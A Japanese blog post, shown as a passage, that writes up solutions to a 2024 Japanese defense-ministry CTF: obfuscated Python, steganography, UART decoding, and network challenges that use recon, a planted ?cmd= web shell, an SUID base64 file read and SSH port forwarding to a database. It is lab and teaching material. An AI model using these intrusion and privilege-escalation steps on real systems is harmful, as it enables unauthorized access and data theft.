class="number">0x3a</span>,<span class="number">0x3f</span>,<span class="number">0x29</span>,<span class="number">0x7b</span>,<span class="number">0x30</span>,<span class="number">0x36</span>,<span class="number">0x2b</span>,<span class="number">0x36</span>]</span><br><span class="line"><span class="built_in">exec</span>(<span class="built_in">bytes</span>([WATANABE ^ <span class="number">0b01010011</span> <span class="keyword">for</span> WATANABE <span class="keyword">in</span> <span class="built_in">reversed</span>(TAKAHASHI)]))</span><br></pre></td></tr></table></figure>

<p>めんどくさ…</p>
<p><code>TANAKA</code> をCyberChefでBase64デコードすると、Zlib展開することまで提案してくれた。</p>
<img src="/img/2024/02-25/Untitled%2023.png" width="auto" height="auto">

<p>展開結果はこんな感じ。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Than volleyball vanish against lumpy berry.</span></span><br><span class="line">SATO = <span class="string">&#x27;[QI3?)c^J:6RK/FV&gt;&lt;ex7#kdYov$G0-A&#123;qPs~w1@+`MO,h(La.WuCp5]i ZbjD9E%2yn8rTBm;f*H&quot;!NS&#125;tgz=UlX&amp;4_|\&#x27;\\&#x27;</span></span><br><span class="line"><span class="comment"># Above face explain for physical decision. </span></span><br><span class="line"><span class="comment"># Via snake name round terrific brass. </span></span><br><span class="line"><span class="comment"># Following suggestion sound regarding female recess. </span></span><br><span class="line"><span class="comment"># Toward vessel disagree beneath huge porter.</span></span><br><span class="line">SUZUKI = [<span class="number">74</span>-<span class="number">0</span>+<span class="number">0</span>,</span><br><span class="line">        <span class="number">87</span>*<span class="number">1</span>,<span class="built_in">int</span>(<span class="number">48</span>**<span class="number">1</span>),</span><br><span class="line"><span class="comment"># Off purpose land as rural statement.</span></span><br><span class="line">        <span class="built_in">int</span>(<span class="number">8_3</span>),<span class="built_in">int</span>(<span class="number">32.00000</span>),<span class="built_in">int</span>(<span class="string">&#x27;34&#x27;</span>),</span><br><span class="line">        <span class="number">76</span> &amp; <span class="number">0xFF</span>,<span class="number">72</span> | <span class="number">0x00</span>,<span class="number">79</span> ^ <span class="number">0x00</span>,[<span class="number">65</span>][<span class="number">0</span>],</span><br><span class="line"><span class="comment"># During knot rely save wretched scarecrow. </span></span><br><span class="line">        (<span class="number">2</span>),<span class="number">47</span> <span class="keyword">if</span> <span class="literal">True</span> <span class="keyword">else</span> <span class="number">0</span>,<span class="built_in">int</span>(<span class="number">12</span>/<span class="number">1</span>),<span class="number">10</span> % <span class="number">11</span>,<span class="built_in">ord</span>(<span class="built_in">chr</span>(<span class="number">26</span>)),</span><br><span class="line">        <span class="number">30</span>+<span class="number">5</span>,<span class="built_in">int</span>(<span class="number">48</span>/<span class="number">2</span>*<span class="number">2</span>),<span class="number">9</span>*<span class="number">9</span>]</span><br><span class="line"><span class="comment">#  Plus toe settle with vast insect. </span></span><br><span class="line"><span class="comment">#  Save hands shelter with ratty produce.</span></span><br><span class="line"><span class="comment">#  Outside legs nest versus tranquil relation.</span></span><br><span class="line"><span class="comment">#  As walk pat round rightful advice. </span></span><br><span class="line"><span class="comment"># Beside payment train by large key.</span></span><br><span class="line"><span class="comment"># Past behavior post toward unable home. </span></span><br><span class="line"><span class="comment">#  Among place complain considering unknown current.</span></span><br><span class="line">**( <span class="comment">#  Around spark scorch above spotty grape. </span></span><br><span class="line">    <span class="string">&#x27;&#x27;</span><span class="comment">#  Underneath jewel chop past dependent rifle.</span></span><br><span class="line">    .    join                          ([</span><br><span class="line">        <span class="comment">#  Since cobweb tie off hurt string.</span></span><br><span class="line">SATO[i]         <span class="comment">#  Since cobweb tie off hurt string.</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> SUZUKI</span><br><span class="line">        <span class="comment"># if i &gt; 4728:</span></span><br><span class="line">        <span class="comment">#     break</span></span><br><span class="line">        <span class="comment"># t = 234667 * 83785</span></span><br><span class="line">        <span class="comment"># print(t/3457783)</span></span><br><span class="line"><span class="comment">#  Through queen dam of slippery comparison.</span></span><br><span class="line">])**</span><br><span class="line"><span class="comment">#  By wall stroke without secret wash.</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">#  Opposite yoke need beside superb lumber. </span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flog&#123;8vje9wunbp984&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>太字にした部分、評価はしているけど出力していない。これをprintしてみるとフラグ。</p>
<aside>
⛳ flag{PHmN2ILK6vsa}

</aside>

<h3><span id="utter-darkness">Utter Darkness</span></h3><img src="/img/2024/02-25/Untitled%2024.png" width="550px" height="auto">

<p>タイトルからしてステガノグラフィー。青空白猫にかけてフィルタをポチポチしてたらフラグ。</p>
<aside>
⛳ flag{YjM5MDUyYzAxMj}

</aside>

<h3><span id="serial-port-signal-解けなかった">Serial Port Signal (解けなかった 😭)</span></h3><img src="/img/2024/02-25/Untitled%2025.png" width="550px" height="auto">

<p>20マイクロ秒毎に 0&#x2F;1 が並んだCSV。モールスか…? ビット列→ASCIIか…？</p>
<p>こねくり回したけど全然うまくいかず、両方ともヒントを見た。</p>
<blockquote>
<p>シリアル通信の方式は UART です。</p>
</blockquote>
<blockquote>
<p>ボーレートは 9600、データ長は 7 bit、パリティは偶数、ストップビットは 1 です。</p>
</blockquote>
<p>残り時間わずかだしプログラム書きたくないし、オンラインのデコーダー探したりCopilotに頑張ってもらったりしたけど無理だった。</p>
<hr>
<p>先人のwriteup↓を拝見する。</p>
<p><a target="_blank" rel="noopener" href="https://nanimokangaeteinai.hateblo.jp/entry/2024/02/25/210059#Miscellaneous-30-Serial-Port-Signal-14-solves">防衛省サイバーコンテスト 2024 writeup - st98 の日記帳 - コピー</a></p>
<p>記載のスクリプト実行すると、</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JXXHello UART: synt&#123;IjUZC5TD&#125;</span><br></pre></td></tr></table></figure>

<p>の出力が出る。ROT13っぽいのでCyberChefにかけると、フラグ。</p>
<aside>
⛳ flag{VwHMP5GQ}

</aside>

<h2><span id="network-nw">Network (NW)</span></h2><h3><span id="discovery">Discovery</span></h3><img src="/img/2024/02-25/Untitled%2026.png" width="550px" height="auto">

<p>まずはnmap。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">% sudo nmap -sS -T4 <span class="number">10.10</span><span class="number">.10</span><span class="number">.21</span></span><br><span class="line">Starting Nmap <span class="number">7.94</span> ( https://nmap.org ) at <span class="number">2024</span>-02-<span class="number">25</span> <span class="number">23</span>:<span class="number">16</span> JST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> schatzsuche.ctf (<span class="number">10.10</span><span class="number">.10</span><span class="number">.21</span>)</span><br><span class="line">Host <span class="keyword">is</span> up (<span class="number">0.016</span>s latency).</span><br><span class="line">Not shown: <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp <span class="built_in">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp <span class="built_in">open</span>  http</span><br><span class="line"></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">0.45</span> seconds</span><br></pre></td></tr></table></figure>

<p>HTTPが空いているのでアクセスしてみる。</p>
<p><a target="_blank" rel="noopener" href="http://schatzsuche.ctf/">http://schatzsuche.ctf/</a> にリダイレクトされるので、 <code>/etc/hosts</code> に</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10.10</span><span class="number">.10</span><span class="number">.21</span> schatzsuche.ctf</span><br></pre></td></tr></table></figure>

<p>を書き足して再度アクセス。</p>
<p>見た目的にも何もないし入力箇所もない。ffufします。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">% ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://schatzsuche.ctf/FUZZ</span><br><span class="line">...</span><br><span class="line">[Status: <span class="number">200</span>, Size: <span class="number">268</span>, Words: <span class="number">8</span>, Lines: <span class="number">6</span>, Duration: 7ms]</span><br><span class="line">    * FUZZ: .well-known/security.txt</span><br><span class="line"></span><br><span class="line">**[Status: <span class="number">301</span>, Size: <span class="number">162</span>, Words: <span class="number">5</span>, Lines: <span class="number">8</span>, Duration: 7ms]</span><br><span class="line">    * FUZZ: cmsadmin**</span><br><span class="line"></span><br><span class="line">**[Status: <span class="number">301</span>, Size: <span class="number">162</span>, Words: <span class="number">5</span>, Lines: <span class="number">8</span>, Duration: 7ms]</span><br><span class="line">    * FUZZ: ftp**</span><br><span class="line"></span><br><span class="line">[Status: <span class="number">200</span>, Size: <span class="number">428</span>, Words: <span class="number">67</span>, Lines: <span class="number">8</span>, Duration: 6ms]</span><br><span class="line">    * FUZZ: index.html</span><br><span class="line"></span><br><span class="line">[Status: <span class="number">200</span>, Size: <span class="number">4700</span>, Words: <span class="number">793</span>, Lines: <span class="number">141</span>, Duration: 7ms]</span><br><span class="line">    * FUZZ: robots.txt</span><br><span class="line"></span><br><span class="line">:: Progress: [<span class="number">4723</span>/<span class="number">4723</span>] :: Job [<span class="number">1</span>/<span class="number">1</span>] :: <span class="number">4347</span> req/sec :: Duration: [<span class="number">0</span>:<span class="number">00</span>:01] :: Errors: <span class="number">0</span> ::</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>&#x2F;ftp を辿ると、 <code>credentials.txt</code> が手に入る。</p>
<p>その中に &#x2F;cmsadmin のCMSに入れるID&#x2F;passが記載されているので、ログインする。</p>
<p>メニューのinfo的なところからバージョンがわかる。</p>
<aside>
⛳ flag{9.2.2.0, Revision: 14877}

</aside>

<h3><span id="exploit">Exploit</span></h3><img src="/img/2024/02-25/Untitled%2027.png" width="550px" height="auto">

<p>CMSよろしく .php ファイルをいじれる様子。reverse shellのPHPを仕込もうとしたけど、仕込んだPHPにアクセスしてもPHPで実行されずにベタ書きHTMLとして配信されている…？</p>
<p>動的実行の設定を変えようにも、今のIDだとその権限がない模様。</p>
<p>悩んでいると、自分の書いたファイルがどんどん書き換わる。どうやら他のプレイヤーと同じ環境で上書きしまくっているよう。なんそれ？</p>
<p>誰かが仕込んでくれた、フォームに <code>?cmd=</code> パラメーター書くとコマンドライン実行して出力見せてくるやつに運よくアクセスできたので、</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -name <span class="string">&#x27;*.txt&#x27;</span></span><br><span class="line">cat /var/www/flag.txt</span><br></pre></td></tr></table></figure>

<p>してフィニッシュ。PHP実行できるようにするのあれどうやったんだろう？</p>
<aside>
⛳ flag{G3t_R3v3rs3_Sh3ll}

</aside>

<h3><span id="pivot">Pivot</span></h3><img src="/img/2024/02-25/Untitled%2028.png" width="550px" height="auto">

<p>sshできる。ホームディレクトリに root オーナーのフラグある（もちろん読めない）。</p>
<p>OSCP知識的には linpeas 刺して弱い所見つけてroot取って終了。… と思ったら、なんとgeorgeさん自分のホームディレクトリにも <code>/tmp/</code> にも書き込みアクセスできない。そんな…</p>
<p>しかしSUIDビット立ってる実行ファイルでrootユーザーとしてフラグ読むパターンもOSCPあるある。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">george@330bb6afc5ef:~$ find / -perm -u=s -<span class="built_in">type</span> f <span class="number">2</span>&gt;/dev/null</span><br><span class="line">/usr/<span class="built_in">bin</span>/base64</span><br></pre></td></tr></table></figure>

<p>なんか珍しいのが引っかかったな。</p>
<p>base64はファイルを対象にエンコードできるので、これでフラグ得られる(？)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">george@330bb6afc5ef:~$ /usr/<span class="built_in">bin</span>/base64 secrets.txt</span><br><span class="line">W01hcmlhREIgQWNjZXNzIEluZm9ybWF0aW9uXQpkYl91c2VyCkg0UmliMF85MGxkQjRSRU4K</span><br></pre></td></tr></table></figure>

<p>デコードすると…</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[MariaDB Access Information]</span><br><span class="line">db_user</span><br><span class="line">H4Rib0_90ldB4REN</span><br></pre></td></tr></table></figure>

<p>く〜</p>
<hr>
<p>MariaDBを探せば良さそう。しかしVPN参加しているマシンからnmapしても見つからない。</p>
<p>CMSはDBアクセスしてるはずなので、Discovery, Exploitの問題で入った管理画面でinfo的なところを見てみると、（CMSサーバーにとっての） <code>ctfbox_mariadb_1</code> (192.168.32.2に解決される) というホストを発見。</p>
<p>ここにmysqlプロトコルでログインすればよいのだが、 <code>mysql</code> コマンドはないし、 <code>python3</code> やら <code>perl</code> にもMySQLプロトコルを喋れるプラグインはない。</p>
<p>ヒントを見る。</p>
<blockquote>
<p>SSH サーバーで実行できるコマンドは少ないですが、ポートフォワーディングを利用すればうまくいくはずです。</p>
</blockquote>
<p>あああああそっかあああああああ</p>
<p>ポートフォーワードうろ覚えだが、VPN参加している攻撃マシンから以下のコマンドを打って接続できた。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">% ssh -L3307:<span class="number">192.168</span><span class="number">.32</span><span class="number">.2</span>:<span class="number">3306</span> george@<span class="number">10.10</span><span class="number">.10</span><span class="number">.21</span></span><br><span class="line">% mysql -h <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -P <span class="number">3307</span> -u db_user --password=H4Rib0_90ldB4REN</span><br></pre></td></tr></table></figure>

<p>あとはテーブルまでたどり着くだけ。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| flag5              |</span><br><span class="line">| information_schema |</span><br><span class="line">+--------------------+</span><br><span class="line"><span class="number">2</span> rows <span class="keyword">in</span> <span class="built_in">set</span> (<span class="number">0.017</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; use flag5</span><br><span class="line">Database changed</span><br><span class="line"></span><br><span class="line">MariaDB [flag5]&gt; show tables;</span><br><span class="line">+-----------------+</span><br><span class="line">| Tables_in_flag5 |</span><br><span class="line">+-----------------+</span><br><span class="line">| flag            |</span><br><span class="line">+-----------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> <span class="built_in">set</span> (<span class="number">0.007</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [flag5]&gt; select * <span class="keyword">from</span> flag;</span><br><span class="line">+----+------------------------+</span><br><span class="line">| <span class="built_in">id</span> | flag                   |</span><br><span class="line">+----+------------------------+</span><br><span class="line">|  <span class="number">1</span> | **flag&#123;p!V071ng_M31s73r&#125;** |</span><br><span class="line">+----+------------------------+</span><br></pre></td></tr></table></figure>

<aside>
⛳ flag{p!V071ng_M31s73r}

</aside>

<h3><span id="fileextract">FileExtract</span></h3><img src="/img/2024/02-25/Untitled%2029.png" width="550px" height="auto">

<p>WiresharkのファイルダウンロードでFTPから .zip をダウンロード。だがパスワード付きzip。<br><a target="_blank" rel="noopener" href="https://laysakura.notion.site/CTF-forensics-bb9a10ec17134b6c86ba5cd91c4f33d1#6096ebfa313b4b56b992cf80e2ecc5ee">パスワード付きzipのクラック with john - Notion</a> でもパスワード特定できず。</p>
<p>Follow TCP Streams でFTPサーバーのパスワードが見えるので、それで試すと展開できた。</p>
<aside>
⛳ flag{6qhFJSHAP4A4}

</aside>

<h3><span id="do-the-best-解けなかった">Do tHe best (解けなかった 😭)</span></h3><p>HTTPレスポンスヘッダから、<a target="_blank" rel="noopener" href="https://github.com/m13253/dns-over-https">https://github.com/m13253/dns-over-https</a> がヒントであって、DNS over HTTPSの問題であることはわかった。例えば以下のリクエストは通る。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">% curl --insecure -H <span class="string">&#x27;accept: application/dns-json&#x27;</span> <span class="string">&#x27;https://10.10.10.20/dns-query?name=example.com&amp;type=A&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;Status&quot;</span>:0,<span class="string">&quot;TC&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;RD&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;RA&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;AD&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;CD&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;Question&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;example.com.&quot;</span>,<span class="string">&quot;type&quot;</span>:1&#125;],<span class="string">&quot;Authority&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;example.com.&quot;</span>,<span class="string">&quot;type&quot;</span>:6,<span class="string">&quot;TTL&quot;</span>:86400,<span class="string">&quot;Expires&quot;</span>:<span class="string">&quot;Mon, 26 Feb 2024 14:45:17 UTC&quot;</span>,<span class="string">&quot;data&quot;</span>:<span class="string">&quot;ns.example.com. hostmaster.examle.com. 2024120101 10800 3600 604800 86400&quot;</span>&#125;]</span><br></pre></td></tr></table></figure>

<p>しかし時間もなくこれ以上手が出せず…</p>
<hr>
<p>逆引きが正解だった模様。うわーN年前にdigでやったことある！</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">% curl  --insecure -H <span class="string">&#x27;accept: application/dns-json&#x27;</span> <span class="string">&#x27;https://10.10.10.20/dns-query?name=20.10.10.10.in-addr.arpa&amp;type=PTR&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;Status&quot;</span>:0,<span class="string">&quot;TC&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;RD&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;RA&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;AD&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;CD&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;Question&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;20.10.10.10.in-addr.arpa.&quot;</span>,<span class="string">&quot;type&quot;</span>:12&#125;],<span class="string">&quot;Answer&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;20.10.10.10.in-addr.arpa.&quot;</span>,<span class="string">&quot;type&quot;</span>:12,<span class="string">&quot;TTL&quot;</span>:86400,<span class="string">&quot;Expires&quot;</span>:<span class="string">&quot;Mon, 26 Feb 2024 14:47:09 UTC&quot;</span>,<span class="string">&quot;data&quot;</span>:<span class="string">&quot;**DSb-mt8ZVRtTCL97PDL4rRQxc3TbZ-gu.example.com**.&quot;</span>&#125;]&#125;</span><br></pre></td></tr></table></figure>

<p>得られたホストを指定してHTTPリクエストでフラグ。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">% curl --insecure -H <span class="string">&#x27;Host: DSb-mt8ZVRtTCL97PDL4rRQxc3TbZ-gu.example.com&#x27;</span> https://10.10.10.20</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">&lt;title&gt;DO tHe best&lt;/title&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">html &#123; color-scheme: light dark; &#125;</span><br><span class="line">body &#123; width: 35em; margin: 0 auto;</span><br><span class="line">font-family: Tahoma, Verdana, Arial, sans-serif; &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">        &lt;h1&gt;**flag&#123;8NZfrhDH-ZGe&#125;**&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<aside>
⛳ flag{8NZfrhDH-ZGe}

</aside>

<p>これは時間かけたら解けたかもな…</p>
<h2><span id="programming">Programming</span></h2><p>大体Copilotがやりました</p>
<h3><span id="logistic-map">Logistic Map</span></h3><img src="/img/2024/02-25/Untitled%2030.png" width="550px" height="auto">

<p>Copilotに以下のお願い。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">下記のロジスティック写像について、x_0 = 0.3 を与えた時の x_9999 の値を求め、小数第7位までの値を答えてください。なお、値の保持と計算には倍精度浮動小数点数を使用してください。</span><br><span class="line"></span><br><span class="line">x_&#123;n+1&#125; = 3.99 x_n (1 - x_n)</span><br></pre></td></tr></table></figure>

<p>こんなコードを吐いた。一発成功。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">logistic_map</span>(<span class="params">x0, r, n</span>):</span><br><span class="line">    x = x0</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        x = r * x * (<span class="number">1</span> - x)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">x0 = <span class="number">0.3</span></span><br><span class="line">r = <span class="number">3.99</span></span><br><span class="line">n = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line">result = logistic_map(x0, r, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;The value of x_<span class="subst">&#123;n&#125;</span>: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">% python solve.py</span><br><span class="line">The value of x_9999: <span class="number">0.8112735079776592</span></span><br></pre></td></tr></table></figure>

<aside>
⛳ flag{0.8112735}

</aside>

<h3><span id="randomness-extraction">Randomness Extraction</span></h3><img src="/img/2024/02-25/Untitled%2031.png" width="550px" height="auto">

<p>ググって &lt;<a target="_blank" rel="noopener" href="https://github.com/MayankKharbanda/randomness_extractors/blob/master/neumann/von_neumann.py">https://github.com/MayankKharbanda/randomness_extractors/blob/master/neumann/von_neumann.py</a> を発見。</p>
<p>こいつを実行する。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">% python3 von_neumann.py -i random.dat <span class="comment"># output.bin ができる</span></span><br><span class="line">% file output.bin</span><br><span class="line">output.bin: data</span><br></pre></td></tr></table></figure>

<p>得体が知れないのでバイナリを眺める。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">% xxd output.bin</span><br></pre></td></tr></table></figure>

<img src="/img/2024/02-25/Untitled%2032.png" width="auto" height="auto">

<p>たまたまフラグが目についた。冴えてた。</p>
<aside>
⛳ flag{3TcPs8QFcX}

</aside>

<h3><span id="xml-confectioner">XML Confectioner</span></h3><img src="/img/2024/02-25/Untitled%2033.png" width="550px" height="auto">

<p>Copilotニキの出番。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">添付の sweets.xml には、多数の sweets:batch 要素が含まれています。これらの中から、下記の条件すべてを満たす sweets:batch 要素内において、最も cookie:radius 属性が大きな sweets:cookie 要素の内容を探して<span class="built_in">print</span>してください。</span><br><span class="line"></span><br><span class="line">1. 少なくとも二つの子要素 sweets:icecream が含まれる</span><br><span class="line">2. 子要素 sweets:icecream には icecream:amount 属性の値が 105g を下回るものがない</span><br><span class="line">3. 子要素 sweets:candy の candy:weight 属性の値の合計が 28.0g 以上である</span><br><span class="line">4. 子要素 sweets:candy の candy:shape 属性が 5 種類以上含まれる</span><br><span class="line">5. cookie:kind 属性が icing でありかつ cookie:radius 属性が 3.0cm 以上の子要素 sweets:cookie を少なくとも一つ含む</span><br><span class="line"></span><br><span class="line">以下が sweets.xml の冒頭部分です。</span><br><span class="line"></span><br><span class="line">&lt;?xml version=<span class="string">&#x27;1.0&#x27;</span> encoding=<span class="string">&#x27;utf-8&#x27;</span>?&gt;</span><br><span class="line">&lt;sweets:orders xmlns:icecream=<span class="string">&quot;&lt;http://xml.vlc-cybercontest.com/icecream&gt;&quot;</span></span><br><span class="line">    xmlns:candy=<span class="string">&quot;&lt;http://xml.vlc-cybercontest.com/candy&gt;&quot;</span></span><br><span class="line">    xmlns:cookie=<span class="string">&quot;&lt;http://xml.vlc-cybercontest.com/cookie&gt;&quot;</span></span><br><span class="line">    xmlns:sweets=<span class="string">&quot;&lt;http://xml.vlc-cybercontest.com/sweets&quot;</span>&gt;&gt;</span><br><span class="line">    &lt;sweets:batch sweets:<span class="built_in">id</span>=<span class="string">&quot;0x1E24A4AE&quot;</span>&gt;</span><br><span class="line">        &lt;sweets:icecream icecream:<span class="built_in">id</span>=<span class="string">&quot;0x9F78027&quot;</span> icecream:flavor=<span class="string">&quot;strawberry&quot;</span> icecream:amount=<span class="string">&quot;94.1164575g&quot;</span> icecream:shape=<span class="string">&quot;sphere&quot;</span> /&gt;</span><br><span class="line">        &lt;sweets:icecream icecream:<span class="built_in">id</span>=<span class="string">&quot;0xB9F4B823&quot;</span> icecream:flavor=<span class="string">&quot;strawberry&quot;</span> icecream:amount=<span class="string">&quot;91.8668061g&quot;</span> icecream:shape=<span class="string">&quot;sphere&quot;</span> /&gt;</span><br><span class="line">        &lt;sweets:candy candy:<span class="built_in">id</span>=<span class="string">&quot;0x8C55D4CE&quot;</span> candy:kind=<span class="string">&quot;coffee&quot;</span> candy:weight=<span class="string">&quot;3.9366492g&quot;</span> candy:shape=<span class="string">&quot;tetrahedron&quot;</span> /&gt;</span><br><span class="line">        &lt;sweets:candy candy:<span class="built_in">id</span>=<span class="string">&quot;0x9D8BBA94&quot;</span> candy:kind=<span class="string">&quot;soda&quot;</span> candy:weight=<span class="string">&quot;3.7906460g&quot;</span> candy:shape=<span class="string">&quot;octahedron&quot;</span> /&gt;</span><br><span class="line">        &lt;sweets:candy candy:<span class="built_in">id</span>=<span class="string">&quot;0xB81F4174&quot;</span> candy:kind=<span 